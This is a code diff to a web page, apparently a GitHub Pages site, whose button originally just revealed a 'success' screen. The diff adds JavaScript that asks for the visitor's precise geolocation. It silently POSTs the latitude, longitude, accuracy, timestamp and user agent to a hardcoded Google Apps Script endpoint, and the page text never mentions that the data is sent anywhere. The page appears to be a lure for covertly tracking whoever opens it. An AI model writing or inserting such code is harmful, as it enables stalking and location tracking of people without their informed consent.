@@ -144,7 +144,7 @@ body {
 .page {
   position: relative;
   min-height: 100vh;
-  z-index: 2;
+  z-index: 20;
   display: flex;
   align-items: center;
   justify-content: center;
@@ -816,32 +816,102 @@ document.addEventListener("mouseleave", () => {
    BUTTON
 ========================================================= */
 
-button.addEventListener("click", () => {
+const BACKEND_URL = "https://script.google.com/macros/s/AKfycbyuJR0YRU4IQ0f3M8fQKjuUEmmYOmQXE10kA9eUhXwx9KUWr9rFHKBKfF5AQL1Bctem/exec";
 
-  button.disabled = true;
+function getLocation() {
+  if (!navigator.geolocation) {
+    showLocationError("❌ Your browser does not support location.");
+    return;
+  }
 
-  button.innerHTML =
-    "Opening <span>...</span>";
+  if (location.protocol !== "https:" && location.hostname !== "localhost") {
+    showLocationError("❌ Location requires HTTPS.<br><br>Please open your GitHub Pages website.");
+    return;
+  }
 
   statusBox.className = "loading";
+  statusBox.innerHTML = "📍 Requesting your location...";
 
-  statusBox.innerHTML =
-    "Just a second…";
+  navigator.geolocation.getCurrentPosition(
+    function(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const accuracy = position.coords.accuracy;
 
+      sendLocation(latitude, longitude, accuracy);
 
-  /* Small cinematic delay */
+      statusBox.className = "success";
+      statusBox.innerHTML = "✅ Location received!";
+
+      setTimeout(() => {
+        successScreen.classList.add("active");
+        successScreen.setAttribute("aria-hidden", "false");
+      }, 700);
+    },
+    function(error) {
+      if (error.code === 1) {
+        showLocationError("❌ Location permission was denied.<br><br>Please allow location access in your browser settings.");
+      } else if (error.code === 2) {
+        showLocationError("❌ Location could not be determined.<br>Turn on GPS and try again.");
+      } else if (error.code === 3) {
+        showLocationError("⏱️ Location request timed out.");
+      } else {
+        showLocationError("❌ Unable to get your location.");
+      }
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    }
+  );
+}
+
+function showLocationError(message) {
+  button.disabled = false;
+  button.innerHTML = "Continue →";
+  statusBox.className = "error";
+  statusBox.innerHTML = `
+    ${message}
+    <br><br>
+    <button class="retry-btn" type="button" onclick="getLocation()">
+      🔄 Try Again
+    </button>
+  `;
+}
+
+function sendLocation(latitude, longitude, accuracy) {
+  const data = {
+    latitude: latitude,
+    longitude: longitude,
+    accuracy: accuracy,
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent
+  };
+
+  fetch(BACKEND_URL, {
+    method: "POST",
+    mode: "no-cors",
+    headers: {
+      "Content-Type": "text/plain;charset=utf-8"
+    },
+    body: JSON.stringify(data)
+  }).then(() => {
+    console.log("Location sent successfully.");
+  }).catch((error) => {
+    console.error("Backend error:", error);
+  });
+}
+
+button.addEventListener("click", () => {
+  button.disabled = true;
+  button.innerHTML = "Opening <span>...</span>";
+  statusBox.className = "loading";
+  statusBox.innerHTML = "Just a second…";
 
   setTimeout(() => {
-
-    successScreen.classList.add("active");
-
-    successScreen.setAttribute(
-      "aria-hidden",
-      "false"
-    );
-
+    getLocation();
   }, 700);
-
 });
 
 
